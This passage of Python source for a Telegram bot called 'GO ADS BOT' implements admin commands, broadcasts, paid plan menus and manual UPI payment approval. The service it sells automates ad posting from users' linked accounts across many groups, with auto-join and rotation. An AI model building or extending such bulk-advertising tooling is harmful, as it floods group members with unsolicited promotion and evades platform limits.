            await event.respond(file=welcome_image, message=plan_msg, buttons=plan_select_keyboard(uid))
        else:
            await event.respond(plan_msg, buttons=plan_select_keyboard(uid))
    else:
        # No accounts, show welcome screen
        welcome_text = render_welcome_text()
        
        welcome_image = MESSAGES.get('welcome_image', '')
        if welcome_image:
            await event.respond(
                file=welcome_image,
                message=welcome_text,
                buttons=new_welcome_keyboard()
            )
        else:
            await event.respond(
                welcome_text,
                buttons=new_welcome_keyboard()
            )

# /ban command - Admin only: Ban a user with reason
@main_bot.on(events.NewMessage(pattern=r'^/ban\s+(\d+)\s+(.+)'))
async def cmd_ban(event):
    if not is_admin(event.sender_id):
        return
    
    target_id = int(event.pattern_match.group(1))
    reason = event.pattern_match.group(2).strip()
    
    # Ban the user
    users_col.update_one(
        {'user_id': target_id},
        {'$set': {
            'banned': True,
            'ban_reason': reason,
            'banned_at': datetime.now(),
            'banned_by': event.sender_id
        }},
        upsert=True
    )
    
    # Notify the banned user
    try:
        await main_bot.send_message(
            target_id,
            f"<b>🚫 You Are Banned</b>\n\n"
            f"<b>Reason:</b> <code>{reason}</code>\n\n"
            f"<i>You can no longer use this bot. Contact admin if you think this is a mistake.</i>",
            parse_mode='html'
        )
    except Exception:
        pass
    
    await event.respond(f"✅ User {target_id} has been banned.\n\nReason: {reason}")

# /access command removed - no password required anymore
# /admin command removed per user request (use admin panel button from dashboard)
# /help command removed per user request

@main_bot.on(events.NewMessage(pattern=r'^/rmprm(?:@[\w_]+)?\s+(\d+)$'))
async def cmd_rmprm(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.respond("Admin only!")
        return
    
    target_id = int(event.pattern_match.group(1))
    remove_user_premium(target_id)
    
    await event.respond(f"Premium removed from {target_id}")

@main_bot.on(events.NewMessage(pattern=r'^/users(?:@[\w_]+)?(?:\s|$)'))
async def cmd_users(event):
    uid = event.sender_id
    if not is_admin(uid):
        return
    
    users = get_all_users()
    if not users:
        await event.respond("No users.")
        return
    
    text = "**All Users**\n\n"
    for u in users[:50]:
        user_id = u.get('user_id')
        tier = u.get('tier', 'free')
        tier_icon = "P" if tier == 'premium' else "F"
        max_acc = u.get('max_accounts', FREE_TIER['max_accounts'])
        accounts = accounts_col.count_documents({'owner_id': user_id})
        is_owner = " (Admin)" if user_id == CONFIG['owner_id'] else ""
        text += f"[{tier_icon}] `{user_id}` - {accounts}/{max_acc} acc{is_owner}\n"
    
    if len(users) > 50:
        text += f"\n...+{len(users)-50} more"
    
    await event.respond(text)

@main_bot.on(events.NewMessage(pattern=r'^/clearusers(?:@[\w_]+)?(?:\s|$)'))
async def cmd_clearusers(event):
    uid = event.sender_id
    if not is_admin(uid):
        return
    
    result = users_col.delete_many({'user_id': {'$ne': int(uid)}})
    approve_user(uid)
    
    await event.respond(f"Cleared {result.deleted_count} users!")

# /ping command removed per user request

@main_bot.on(events.NewMessage(pattern=r'^/reboot(?:@[\w_]+)?(?:\s|$)'))
async def cmd_reboot(event):
    """Admin: Reboot the bot (restart process)."""
    uid = event.sender_id
    if not is_admin(uid):
        return
    
    await event.respond("🔄 Rebooting bot...")
    
    # Restart the process
    os.execv(sys.executable, ['python'] + sys.argv)

@main_bot.on(events.NewMessage(pattern=r'^/addadmin(?:@[\w_]+)?\s+(\d+)$'))
async def cmd_addadmin(event):
    """Admin: Add admin."""
    uid = event.sender_id
    if not is_admin(uid):
        return
    
    target_uid = int(event.pattern_match.group(1))
    
    # Check if already admin
    if admins_col.find_one({'user_id': target_uid}):
        await event.respond(f"`{target_uid}` is already an admin!")
        return
    
    # Add to admins
    admins_col.insert_one({'user_id': target_uid, 'added_at': datetime.now(), 'added_by': uid})
    
    # Notify
    try:
        await main_bot.send_message(target_uid, "🎉 You've been granted admin access!")
    except:
        pass
    
    await event.respond(f"✅ Added `{target_uid}` as admin!")

@main_bot.on(events.NewMessage(pattern=r'^/rmadmin(?:@[\w_]+)?\s+(\d+)$'))
async def cmd_rmadmin(event):
    """Admin: Remove admin."""
    uid = event.sender_id
    if not is_admin(uid):
        return
    
    target_uid = int(event.pattern_match.group(1))
    
    # Cannot remove owner
    if target_uid == CONFIG['owner_id']:
        await event.respond("Cannot remove owner!")
        return
    
    # Remove from admins
    result = admins_col.delete_one({'user_id': target_uid})
    
    if result.deleted_count > 0:
        # Notify
        try:
            await main_bot.send_message(target_uid, "❌ Your admin access has been revoked.")
        except:
            pass
        
        await event.respond(f"✅ Removed `{target_uid}` from admins!")
    else:
        await event.respond(f"`{target_uid}` is not an admin!")

# /go command removed per user request (use Start button from dashboard)


# /run, /status, /me, /stats, /finduser, /stop commands removed per user request

@main_bot.on(events.NewMessage(pattern=r'^/mystats(?:@[\w_]+)?(?:\s|$)'))
async def cmd_mystats(event):
    """User: Show personal stats."""
    uid = event.sender_id
    
    if not await enforce_forcejoin_or_prompt(event):
        return
    
    user = get_user(uid)
    accounts = get_user_accounts(uid)
    tier = "Premium" if is_premium(uid) else "Free"
    
    total_sent = sum(get_account_stats(str(acc['_id'])).get('total_sent', 0) for acc in accounts)
    total_failed = sum(get_account_stats(str(acc['_id'])).get('total_failed', 0) for acc in accounts)
    active = sum(1 for acc in accounts if acc.get('is_forwarding'))
    
    text = (
        f"📊 **Your Stats**\n\n"
        f"Tier: {tier}\n"
        f"Accounts: {len(accounts)}\n"
        f"Active: {active}\n\n"
        f"Total Sent: {total_sent}\n"
        f"Total Failed: {total_failed}\n"
    )
    
    await event.respond(text)

@main_bot.on(events.NewMessage(pattern=r'^/upgrade(?:@[\w_]+)?(?:\s|$)'))
async def cmd_upgrade(event):
    """User: Show upgrade options."""
    uid = event.sender_id
    
    if not await enforce_forcejoin_or_prompt(event):
        return
    
    # Show plan selection
    plan_msg = (
        "💎 **Choose Your Plan:**\n\n"
        "• Scout - Free starter plan\n"
        "• Grow - Scale your campaigns (₹69)\n"
        "• Prime - Advanced automation (₹199)\n"
        "• Dominion - Enterprise level (₹389)"
    )
    
    welcome_image = MESSAGES.get('welcome_image', '')
    if welcome_image:
        await main_bot.send_file(uid, welcome_image, caption=plan_msg, buttons=plan_select_keyboard(uid))
    else:
        await event.respond(plan_msg, buttons=plan_select_keyboard(uid))

@main_bot.on(events.NewMessage(pattern=r'^/bd(?:@[\w_]+)?$', func=lambda e: e.is_reply))
async def cmd_bd_broadcast(event):
    """Admin: Broadcast by replying to a message with /bd - forwards with sender name, media, buttons"""
    uid = event.sender_id
    if not is_admin(uid):
        return
    
    # Get the replied message
    replied_msg = await event.get_reply_message()
    if not replied_msg:
        await event.respond("Reply to a message with /bd to broadcast it!")
        return
    
    users = get_all_users()
    total = len(users)
    
    # Get sender info
    sender = await replied_msg.get_sender()
    sender_name = getattr(sender, 'first_name', 'Unknown')
    sender_username = getattr(sender, 'username', None)
    sender_display = f"@{sender_username}" if sender_username else sender_name
    
    # Progress message
    progress_msg = await event.respond(f"📢 Broadcasting from {sender_display}...\n0/{total} (0%)")
    
    sent = 0
    failed = 0
    
    for i, u in enumerate(users):
        try:
            # Forward the message directly (preserves media, buttons, formatting)
            await main_bot.forward_messages(
                u['user_id'],
                replied_msg,
                from_peer=event.chat_id
            )
            sent += 1
        except Exception as e:
            failed += 1
            print(f"[BROADCAST] Failed to send to {u['user_id']}: {e}")
        
        # Update progress every 10 users or at end
        if (i + 1) % 10 == 0 or (i + 1) == total:
            percent = int(((i + 1) / total) * 100)
            await progress_msg.edit(
                f"📢 Broadcasting from {sender_display}...\n{i + 1}/{total} ({percent}%)\n\n"
                f"✅ Sent: {sent}\n❌ Failed: {failed}"
            )
        
        # Small delay to avoid flood
        await asyncio.sleep(0.05)
    
    await progress_msg.edit(
        f"✅ <b>Broadcast Complete!</b>\n\n"
        f"<b>From:</b> {sender_display}\n"
        f"<b>Total:</b> {total}\n"
        f"<b>Sent:</b> {sent}\n"
        f"<b>Failed:</b> {failed}",
        parse_mode='html'
    )

@main_bot.on(events.NewMessage(pattern=r'^/broadcast(?:@[\w_]+)?\s+(.+)$', func=lambda e: not e.is_reply))
async def cmd_broadcast(event):
    uid = event.sender_id
    if not is_admin(uid):
        return
    
    msg = event.pattern_match.group(1)
    users = get_all_users()
    
    sent = 0
    failed = 0
    for u in users:
        try:
            await main_bot.send_message(u['user_id'], f"**Announcement**\n\n{msg}")
            sent += 1
        except:
            failed += 1
    
    await event.respond(f"Broadcast complete!\nSent: {sent}\nFailed: {failed}")

# /add command removed per user request (use dashboard Add Account button)

@main_bot.on(events.NewMessage(pattern=r'^/list(?:@[\w_]+)?(?:\s|$)'))
async def cmd_list(event):
    uid = event.sender_id

    if not await enforce_forcejoin_or_prompt(event):
        return

    if not is_approved(uid):
        approve_user(uid)
    
    accounts = get_user_accounts(uid)
    if not accounts:
        await event.respond("No accounts. Use /add")
        return
    
    tier = "Premium" if is_premium(uid) else "Free"
    max_acc = get_user_max_accounts(uid)
    
    text = f"**Your Accounts** ({tier})\n\n"
    for i, acc in enumerate(accounts, 1):
        status = "Active" if acc.get('is_forwarding') else "Inactive"
        text += f"{status} #{i} - {acc['phone']} ({acc.get('name', 'Unknown')})\n"
    text += f"\nUsing: {len(accounts)}/{max_acc}"
    
    await event.respond(text)

@main_bot.on(events.CallbackQuery)
async def callback(event):
    uid = event.sender_id
    data = event.data.decode()
    
    # Ban check - Block banned users from using bot
    if not is_admin(uid):
        user = get_user(uid)
        if user.get('banned'):
            reason = user.get('ban_reason', 'No reason provided')
            await event.answer(
                f"🚫 You are banned!\n\nReason: {reason}",
                alert=True
            )
            return

    # Force-join gate for interactive UI (admin bypass).
    # Allow verify button itself.
    if data != "force_verify":
        if not await enforce_forcejoin_or_prompt(event, edit=True):
            return
    
    try:
        if data == "force_verify":
            # User claims they joined; re-validate.
            if await is_user_passed_forcejoin(uid):
                # Delete the force-join message
                try:
                    await event.delete()
                except:
                    pass
                
                # Show Privacy Policy screen (new flow)
                await main_bot.send_message(
                    uid,
                    MESSAGES['privacy_short'],
                    parse_mode='html',
                    buttons=[
                        [Button.url("📄 View Full Privacy Policy", MESSAGES['privacy_full_link'])],
                        [Button.inline("✅ Accept & Continue", b"accept_privacy")]
                    ]
                )
            else:
                await event.answer("Not joined yet. Please join both Channel and Group.", alert=True)
            return
        
        # Stop button for Auto Group Join
        if data == "auto_join_cancel":
            auto_join_cancel[uid] = True
            await event.answer("⏸ Stopping join process...", alert=False)
            return
        
        if data == "accept_privacy":
            # User accepted privacy policy → Show welcome with GO ADS BOT Ads Now
            welcome_text = (
                "🚀 Welcome to GO ADS BOT!\n\n"
                "Automate your Telegram advertising campaigns across multiple groups.\n\n"
                "<blockquote><b>Plans Available:</b>\n"
                "• Scout (Free)\n"
                "• Grow (₹69)\n"
                "• Prime (₹199)\n"
                "• Dominion (₹389)</blockquote>\n\n"
                "Click <b>GO ADS BOT Ads Now</b> to choose your plan!"
            )
            welcome_image = MESSAGES.get('welcome_image', '')
            if welcome_image:
                await event.delete()
                await main_bot.send_file(
                    uid,
                    welcome_image,
                    caption=welcome_text,
                    parse_mode='html',
                    buttons=[[Button.inline("🚀 GO ADS BOT Ads Now", b"adsye_now")]]
                )
            else:
                await event.edit(
                    welcome_text,
                    parse_mode='html',
                    buttons=[[Button.inline("🚀 GO ADS BOT Ads Now", b"adsye_now")]]
                )
            return


        if data.startswith("plan_"):
            plan_name = data.replace("plan_", "")
            
            plan = PLANS.get(plan_name)
            if not plan:
                await event.answer("Invalid plan!", alert=True)
                return
            
            # Show plan details with tagline + Buy Now button
            # Build plan details text
            detail_text = f"<b>{plan['emoji']} {plan['name']} Plan</b>\n\n"
            detail_text += f"<i>{plan['tagline']}</i>\n\n"
            detail_text += "<blockquote><b>Plan Features:</b>\n\n"
            detail_text += f"💼 <b>Accounts:</b> {plan['max_accounts']}\n"
            
            # Topics and Groups - Only show for premium plans
            if plan_name != 'scout':
                detail_text += f"📂 <b>Topics:</b> {plan['max_topics']}\n"
                detail_text += f"👥 <b>Groups per Topic:</b> {plan['max_groups_per_topic']}\n"
            
            detail_text += "\n⏱️ <b>Delays:</b>\n"
            
            # Delays display
            if plan_name == 'scout':
                detail_text += "  • <b>Slow, Medium, Fast presets</b>\n"
            else:
                detail_text += "  • <b>Custom Message & Round Delays</b>\n"
            
            detail_text += "\n✨ <b>Features:</b>\n"
            
            # Features for Scout plan
            if plan_name == 'scout':
                detail_text += "  • <b>⏱️ ɪɴᴛᴇʀᴠᴀʟ ᴘʀᴇꜱᴇᴛꜱ (ꜱʟᴏᴡ/ᴍᴇᴅɪᴜᴍ/ꜰᴀꜱᴛ)</b>\n"
                detail_text += "  • <b>🔄 ʀᴇꜰʀᴇꜱʜ ᴀʟʟ ɢʀᴏᴜᴘꜱ</b>\n"
                detail_text += "  • <b>📝 ʟᴏɢꜱ:</b> ʏᴇꜱ\n"
                detail_text += "  • <b>📣 ᴀᴅꜱ ᴍᴏᴅᴇ ꜱᴇʟᴇᴄᴛɪᴏɴ</b>\n"
                detail_text += "  • <b>🚫 ᴀᴜᴛᴏ ʟᴇᴀᴠᴇ ꜰᴀɪʟᴇᴅ ɢʀᴏᴜᴘꜱ</b>\n"
            else:
                # Features for premium plans (includes all Scout features + premium features)
                detail_text += "  • <b>⏱️ ɪɴᴛᴇʀᴠᴀʟ ᴘʀᴇꜱᴇᴛꜱ (ꜱʟᴏᴡ/ᴍᴇᴅɪᴜᴍ/ꜰᴀꜱᴛ)</b>\n"
                detail_text += "  • <b>🔄 ʀᴇꜰʀᴇꜱʜ ᴀʟʟ ɢʀᴏᴜᴘꜱ</b>\n"
                detail_text += f"  • <b>📝 ʟᴏɢꜱ:</b> {'ʏᴇꜱ' if plan['logs_enabled'] else 'ɴᴏ'}\n"
                detail_text += "  • <b>📣 ᴀᴅꜱ ᴍᴏᴅᴇ ꜱᴇʟᴇᴄᴛɪᴏɴ</b>\n"
                detail_text += "  • <b>🚫 ᴀᴜᴛᴏ ʟᴇᴀᴠᴇ ꜰᴀɪʟᴇᴅ ɢʀᴏᴜᴘꜱ</b>\n"
                detail_text += f"  • <b>💬 ᴀᴜᴛᴏ ʀᴇᴘʟʏ:</b> {'ʏᴇꜱ' if plan['auto_reply_enabled'] else 'ɴᴏ'}\n"
                detail_text += "  • <b>🔄 ꜱᴍᴀʀᴛ ʀᴏᴛᴀᴛɪᴏɴ:</b> ʏᴇꜱ\n"
                detail_text += "  • <b>👥 ᴀᴜᴛᴏ ɢʀᴏᴜᴘ ᴊᴏɪɴ:</b> ʏᴇꜱ\n"
                detail_text += "  • <b>📂 ᴛᴏᴘɪᴄꜱ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ:</b> ʏᴇꜱ\n"
                detail_text += "  • <b>⏱️ ᴄᴜꜱᴛᴏᴍ ɪɴᴛᴇʀᴠᴀʟꜱ:</b> ʏᴇꜱ\n"
            
            detail_text += "</blockquote>\n\n"
            
            if plan_name == "scout":
                # Free plan - Show "Activate Free" or "Active" button
                user = get_user(uid)
                is_scout_active = user.get('approved') and user.get('tier') == 'free'
                
                detail_text += f"<b>Price: FREE</b>"
                
                if is_scout_active:
                    buttons = [
                        [Button.inline("✓ Active Plan", b"enter_dashboard")],
                        [Button.inline("← Back to Plans", b"back_plans")]
                    ]
                else:
                    buttons = [
                        [Button.inline("✅ Activate Free Plan", b"activate_scout")],
                        [Button.inline("← Back to Plans", b"back_plans")]
                    ]
            else:
                # Paid plans - Check if user already has this plan AND it's still active
                user = get_user(uid)
                user_plan_name = user.get('plan_name', '').lower()
                
                # Check if plan matches AND user is still premium (not expired/revoked)
                is_active_plan = (user_plan_name == plan_name) and is_premium(uid)
                
                detail_text += f"<b>Price: {plan['price_display']}</b>"
                
                if is_active_plan:
                    # User already has this plan - show Active
                    buttons = [
                        [Button.inline("✓ Active Plan", b"enter_dashboard")],
                        [Button.inline("← Back to Plans", b"back_plans")]
                    ]
                else:
                    # Show Buy Now button
                    buttons = [
                        [Button.inline(f"💳 Buy Now - {plan['price_display']}", f"buy_{plan_name}")],
                        [Button.inline("← Back to Plans", b"back_plans")]
                    ]
            
            # Show plan-specific image if available
            plan_image = PLAN_IMAGES.get(plan_name)
            if plan_image and plan_name in ['grow', 'prime', 'dominion']:
                await event.edit(file=plan_image, text=detail_text, parse_mode='html', buttons=buttons)
            else:
                await event.edit(detail_text, parse_mode='html', buttons=buttons)
            return
        
        if data == "activate_scout":
            # Activate Scout (free) plan
            approve_user(uid)
            await event.answer("Scout plan activated!", alert=True)
            
            # Redirect to dashboard
            await event.edit(render_dashboard_text(uid), parse_mode='html', buttons=main_dashboard_keyboard(uid))
            return
        
        # ===================== Manual UPI Payment Callbacks =====================
        
        if data.startswith("paydone_"):
            # User clicked "Payment Done" - now ask for screenshot
            parts = data.split("_", 1)
            if len(parts) < 2:
                await event.answer("Invalid payment request", alert=True)
                return
            
            request_id = parts[1]
            pay_req = pending_upi_payments.get(request_id)
            if not pay_req:
                await event.answer("Payment request expired or not found", alert=True)
                return
            
            # Set user state to awaiting screenshot
            pay_req['status'] = 'awaiting_screenshot'
            user_states[uid] = {'state': 'awaiting_payment_screenshot', 'request_id': request_id}
            
            await event.edit(
                "<b>📸 Upload Payment Screenshot</b>\n\n"
                f"<b>Plan:</b> {pay_req['plan_name']}\n"
                f"<b>Amount:</b> ₹{pay_req['price']}\n\n"
                "Please send the payment screenshot now.\n\n"
                "<i>Tap Back to cancel.</i>",
                parse_mode='html',
                buttons=[[Button.inline("🔙 Back", f"payback_{request_id}".encode())]]
            )
            return
        
        elif data.startswith("payback_"):
            # User clicked Back during payment - restore start image
            parts = data.split("_", 1)
            if len(parts) < 2:
                request_id = None
            else:
                request_id = parts[1]
                if request_id in pending_upi_payments:
                    del pending_upi_payments[request_id]
            
            # Clear user state
            if uid in user_states:
                del user_states[uid]
            
            # Show start screen with start image
            welcome_img = MESSAGES.get('welcome_image')
            welcome_txt = (
                "<b>🏠 Welcome Back!</b>\n\n"
                "Payment cancelled. Use the menu below to continue."
            )
            buttons = main_dashboard_keyboard(uid)
            
            try:
                await event.edit(welcome_txt, parse_mode='html', buttons=buttons, file=welcome_img)
            except Exception:
                await event.edit(welcome_txt, parse_mode='html', buttons=buttons)
            return
        
        elif data.startswith("payapprove_"):
            # Admin approves payment
            parts = data.split("_", 1)
            if len(parts) < 2:
                await event.answer("Invalid approve request", alert=True)
                return
            
            request_id = parts[1]
            pay_req = pending_upi_payments.get(request_id)
            if not pay_req:
                await event.answer("Payment request not found or already processed", alert=True)
                return
            
            plan_key = pay_req['plan_key']
            plan = PLANS.get(plan_key)
            if not plan:
                await event.answer("Plan not found", alert=True)
                return
            
            target_uid = pay_req['user_id']
            
            # Grant premium for 30 days (shared helper)
            try:
                await grant_premium_to_user(target_uid, plan_key, 30, source='payment_approval')
            except Exception as e:
                print(f"[PAYMENT] grant_premium_to_user failed: {e}")

            # Update payment status
            pay_req['status'] = 'approved'
            
            # Notify user with plan-specific image
            try:
                plan_image = PLAN_IMAGES.get(plan_key)
                notify_text = (
                    "<b>🎉 Premium Activated!</b>\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    f"<b>Your Plan:</b> {plan['emoji']} <b>{plan['name']}</b>\n"
                    f"<b>Max Accounts:</b> <code>{plan['max_accounts']}</code>\n"
                    f"<b>Duration:</b> <code>30 days</code>\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    f"<b>✅ Payment Approved!</b>\n\n"
                    "<i>Your premium plan has been activated! Enjoy all features.</i>"
                )
                notify_buttons = [
                    [Button.inline("Check Plans", b"back_plans"), Button.inline("GO ADS BOT Ads Now!", b"enter_dashboard")]
                ]
                
                if plan_image and plan_key in ['grow', 'prime', 'dominion']:
                    await main_bot.send_file(target_uid, plan_image, caption=notify_text, parse_mode='html', buttons=notify_buttons)
                else:
                    await main_bot.send_message(target_uid, notify_text, parse_mode='html', buttons=notify_buttons)
            except Exception as e:
                print(f"[PAYMENT] Failed to notify user {target_uid}: {e}")
            
            # Channel notification is handled by grant_premium_to_user()
            
            # Edit admin message
            try:
                # Get original message text and add approval status
                original_text = event.query.message.text if hasattr(event, 'query') and hasattr(event.query, 'message') else "Payment Screenshot"
                await event.edit(
                    original_text + "\n\n<b>✅ APPROVED by admin</b>",
                    parse_mode='html',
                    buttons=None
                )
            except Exception as e:
                print(f"[PAYMENT] Failed to edit admin message: {e}")
            
            await event.answer("Payment approved and user notified!", alert=False)
            
            # Clean up
            del pending_upi_payments[request_id]
            # Remove from message map if exists (message ID comes from event.query.message)
            try:
                if hasattr(event, 'query') and hasattr(event.query, 'message'):
                    message_id = event.query.message.id
                    if message_id in admin_payment_message_map:
                        del admin_payment_message_map[message_id]
            except Exception:
                pass
            return
        
        elif data.startswith("payreject_"):
            # Admin rejects payment
            parts = data.split("_", 1)
            if len(parts) < 2:
                await event.answer("Invalid reject request", alert=True)
                return
            
            request_id = parts[1]
            pay_req = pending_upi_payments.get(request_id)
            if not pay_req:
                await event.answer("Payment request not found or already processed", alert=True)
                return
            
            target_uid = pay_req['user_id']
            pay_req['status'] = 'rejected'
            
            # Notify user
            try:
                await main_bot.send_message(
                    target_uid,
                    f"<b>❌ Payment Rejected</b>\n\n"
                    f"Your payment screenshot was not verified.\n\n"
                    f"Please contact support if you believe this is an error.",
                    parse_mode='html'
                )
            except Exception as e:
                print(f"[PAYMENT] Failed to notify user {target_uid}: {e}")
            
            # Edit admin message
            try:
                # Get original message text and add rejection status
                original_text = event.query.message.text if hasattr(event, 'query') and hasattr(event.query, 'message') else "Payment Screenshot"
                await event.edit(
                    original_text + "\n\n<b>❌ REJECTED by admin</b>",
                    parse_mode='html',
                    buttons=None
                )
            except Exception as e:
                print(f"[PAYMENT] Failed to edit admin message: {e}")
            
            await event.answer("Payment rejected and user notified.", alert=False)
            
            # Clean up
            del pending_upi_payments[request_id]
            # Remove from message map if exists (message ID comes from event.query.message)
            try:
                if hasattr(event, 'query') and hasattr(event.query, 'message'):
                    message_id = event.query.message.id
                    if message_id in admin_payment_message_map:
                        del admin_payment_message_map[message_id]
            except Exception:
                pass
            return
        
        if data.startswith("buy_"):
            # Buy paid plan - show UPI QR directly
            plan_key = data.replace("buy_", "")
            plan = PLANS.get(plan_key)
            if not plan:
                await event.answer("Plan not found", alert=True)
                return
            
            # Create payment request
            request_id = _new_payment_request_id(uid, plan_key)
            sender = await event.get_sender()
            username = sender.username if hasattr(sender, 'username') else None
            
            pending_upi_payments[request_id] = {
                'user_id': uid,
                'username': username,
                'plan_key': plan_key,
                'plan_name': plan['name'],
                'price': plan.get('price', 0),
                'created_at': datetime.now(),
                'status': 'awaiting_payment'
            }
            
            # Show UPI QR
            qr_url = UPI_PAYMENT.get('qr_image_url', '')
            caption = _upi_payment_caption(plan, plan_key)
            
            await event.edit(
                caption,
                parse_mode='html',
                file=qr_url,
                buttons=[
                    [Button.inline("✅ Payment Done", f"paydone_{request_id}".encode())],
                    [Button.inline("🔙 Back", f"payback_{request_id}".encode())]
                ]
            )
            return

        if data == "adsye_now":
            # Acknowledge immediately to avoid Telegram's loading animation
            try:
                await event.answer(cache_time=0)
            except Exception:
                pass

            # NEW FLOW: Show plan selection (not account add)
            plan_msg = render_plan_select_text()
            
            welcome_image = MESSAGES.get('welcome_image', '')
            if welcome_image:
                try:
                    await event.delete()
                except:
                    pass
                await main_bot.send_file(
                    uid,
                    welcome_image,
                    caption=plan_msg,
                    parse_mode='html',
                    buttons=plan_select_keyboard(uid)
                )
            else:
                await event.edit(plan_msg, parse_mode='html', buttons=plan_select_keyboard(uid))
            return

        if data.startswith("admin_"):
            # Admin panel callbacks
            if not is_admin(uid):
                return
            
            if data == "admin_users":
                # System stats (CPU/RAM/Disk) + platform stats
                cpu_pct = psutil.cpu_percent(interval=0.3)
                mem = psutil.virtual_memory()
                root_path = os.path.abspath(os.sep)
                disk = psutil.disk_usage(root_path)

                total_users = users_col.count_documents({})
                premium_users = users_col.count_documents({'tier': 'premium'})
                today_start = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
                new_today = users_col.count_documents({'created_at': {'$gte': today_start}}) if users_col.find_one({}, {'created_at': 1}) else 0
                banned_users = 0  # Placeholder for banned users feature
                
                # Premium by plan (counts)
                grow_count = users_col.count_documents({'tier': 'premium', 'plan_name': {'$regex': '^grow$', '$options': 'i'}})
                prime_count = users_col.count_documents({'tier': 'premium', 'plan_name': {'$regex': '^prime$', '$options': 'i'}})
                dominion_count = users_col.count_documents({'tier': 'premium', 'plan_name': {'$regex': '^dominion$', '$options': 'i'}})
                
                # Accounts
                total_accounts = accounts_col.count_documents({})
                active_broadcasts = accounts_col.count_documents({'is_forwarding': True})
                
                # Messaging stats
                total_ads_sent = sum(stat.get('total_sent', 0) for stat in account_stats_col.find({}, {'total_sent': 1}))
                # Auto replies counter (stored in db, incremented when auto-reply is sent)
                auto_replies = sum(stat.get('auto_replies', 0) for stat in account_stats_col.find({}, {'auto_replies': 1}))
                target_groups = account_topics_col.count_documents({}) + account_auto_groups_col.count_documents({})
                
                # Topics
                total_topics = account_topics_col.count_documents({})
                active_topics = len(set(t['topic'] for t in account_topics_col.find({}, {'topic': 1})))
                failed_topics = account_failed_groups_col.count_documents({})
                
                text = (
                    "<b>📊 Full Statistics</b>\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    "<b>💻 System Performance:</b>\n"
                    f"├ <b>CPU:</b> <code>{cpu_pct:.0f}%</code>\n"
                    f"├ <b>RAM:</b> <code>{mem.percent:.0f}%</code> ({mem.used//(1024**3)}GB / {mem.total//(1024**3)}GB)\n"
                    f"└ <b>Disk:</b> <code>{disk.percent:.0f}%</code> ({disk.used//(1024**3)}GB / {disk.total//(1024**3)}GB)\n\n"
                    "<b>👥 User Statistics:</b>\n"
                    f"├ <b>Total Users:</b> <code>{total_users}</code> <i>(+{new_today} today)</i>\n"
                    f"├ <b>💎 Premium Users:</b> <code>{premium_users}</code>\n"
                    f"└ <b>🚫 Banned Users:</b> <code>{banned_users}</code>\n\n"
                    "<b>💎 Premium by Plan:</b>\n"
                    f"├ <b>📈 Grow:</b> <code>{grow_count}</code>\n"
                    f"├ <b>⭐ Prime:</b> <code>{prime_count}</code>\n"
                    f"└ <b>👑 Dominion:</b> <code>{dominion_count}</code>\n\n"
                    "<b>📱 Account Statistics:</b>\n"
                    f"├ <b>Total Accounts:</b> <code>{total_accounts}</code>\n"
                    f"└ <b>▶️ Active Broadcasts:</b> <code>{active_broadcasts}</code>\n\n"
                    "<b>📈 Messaging Statistics:</b>\n"
                    f"├ <b>✅ Total Ads Sent:</b> <code>{total_ads_sent}</code>\n"
                    f"├ <b>💬 Auto Replies:</b> <code>{auto_replies}</code>\n"
                    f"└ <b>🎯 Target Groups:</b> <code>{target_groups}</code>\n\n"
                    "<b>📂 Topic Statistics:</b>\n"
                    f"├ <b>Total Topics:</b> <code>{total_topics}</code>\n"
                    f"├ <b>Active Topics:</b> <code>{active_topics}</code>\n"
                    f"└ <b>❌ Failed Topics:</b> <code>{failed_topics}</code>\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
                )
                
                await event.edit(text, parse_mode='html', buttons=[[Button.inline("← Back", b"back_admin")]])
                return
            
            if data == "admin_stats":
                # psutil is imported at module level
                cpu = psutil.cpu_percent(interval=1)
                ram = psutil.virtual_memory()
                disk = psutil.disk_usage('/')
                
                text = (
                    "<b>💻 System Statistics</b>\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    "<b>⚡ Performance:</b>\n"
                    f"├ <b>CPU Usage:</b> <code>{cpu}%</code>\n"
                    f"├ <b>RAM Usage:</b> <code>{ram.percent}%</code> ({ram.used // (1024**3)}GB / {ram.total // (1024**3)}GB)\n"
                    f"└ <b>Disk Usage:</b> <code>{disk.percent}%</code> ({disk.used // (1024**3)}GB / {disk.total // (1024**3)}GB)\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
                )
                
                await event.edit(text, parse_mode='html', buttons=[[Button.inline("← Back", b"back_admin")]])
                return
            
            if data == "admin_controls":
                text = "**Bot Controls**\n\nUse commands:\n/ping - System stats\n/reboot - Restart bot"
                await event.edit(text, buttons=[[Button.inline("🏠 Back", b"back_admin")]])
                return
            
            if data == "back_admin":
                # Recreate admin panel
                total_users = users_col.count_documents({})
                premium_users = users_col.count_documents({'tier': 'premium'})
                total_accounts = accounts_col.count_documents({})
                active_accounts = accounts_col.count_documents({'is_forwarding': True})
                total_admins = admins_col.count_documents({}) + 1
                
                text = (
                    "<b>Admin Panel</b>\n\n"
                    "<b>Bot Statistics</b>\n"
                    f"Total Users: <code>{total_users}</code>\n"
                    f"Premium Users: <code>{premium_users}</code>\n"
                    f"Total Accounts: <code>{total_accounts}</code>\n"
                    f"Active Forwarding: <code>{active_accounts}</code>\n"
                    f"Total Admins: <code>{total_admins}</code>\n\n"
                    "<i>Use commands or buttons below:</i>"
                )

                buttons = [
                    [Button.inline("👥 View Users", b"admin_users"), Button.inline("👑 View Admins", b"admin_admins")],
                    [Button.inline("📊 Full Stats", b"admin_stats"), Button.inline("🔧 Bot Controls", b"admin_controls")],
                    [Button.inline("🏠 Back", b"back_start")]
                ]

                await event.edit(text, parse_mode='html', buttons=buttons)
                return

        if data.startswith("addprm_"):
            # Admin granting premium plan
            if not is_admin(uid):
                return
            
            state = user_states.get(uid, {})
            target_uid = state.get('target_uid')
            
            if not target_uid:
                await event.answer("Session expired!", alert=True)
                return
            
            if data == "addprm_cancel":
                del user_states[uid]
                await event.edit("Cancelled.")
                return
            
            # Extract plan name
            plan_name = data.replace("addprm_", "")
            plan = PLANS.get(plan_name)
            
            if not plan:
                await event.answer("Invalid plan!", alert=True)
